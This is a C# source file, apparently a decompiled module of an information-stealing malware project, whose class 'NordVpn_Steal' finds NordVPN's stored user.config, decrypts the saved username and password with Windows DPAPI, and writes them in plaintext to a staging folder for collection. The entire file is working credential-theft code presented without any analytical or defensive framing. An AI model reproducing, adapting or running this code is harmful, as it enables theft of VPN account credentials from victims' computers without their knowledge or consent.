using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace loki.loki.Utilies.App
{
    public static class NordVpn_Steal
    {
        // Token: 0x060007D8 RID: 2008 RVA: 0x000269CC File Offset: 0x00024BCC
        public static void Nord_Vpn_Grabber(string string_0)
        {
            Directory.CreateDirectory(string_0 + "\\Apps\\Vpn");
            using (var streamWriter = new StreamWriter(string_0 + "\\Apps\\Vpn\\NordVPN\\Account.txt"))
            {
                var directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
                if (!directoryInfo.Exists)
                {
                }
                else
                {
                    DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
                    for (int i = 0; i < directories.Length; i++)
                    {
                        foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
                        {
                            streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
                            string text = Path.Combine(directoryInfo2.FullName, "user.config");
                            if (File.Exists(text))
                            {
                                var xmlDocument = new XmlDocument();
                                xmlDocument.Load(text);
                                string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                                string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
                                if (innerText != null && !string.IsNullOrEmpty(innerText))
                                {
                                    streamWriter.WriteLine("\t\tUsername: " + Nord_Vpn_Decoder(innerText));
                                }
                                if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
                                {
                                    streamWriter.WriteLine("\t\tPassword: " + Nord_Vpn_Decoder(innerText2));
                                }
                            }
                        }
                    }
                }
            }
        }
        public static string Nord_Vpn_Decoder(string s)
        {
            string result;
            try
            {
                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
            }
            catch
            {
                result = "";
            }
            return result;
        }
    }
}
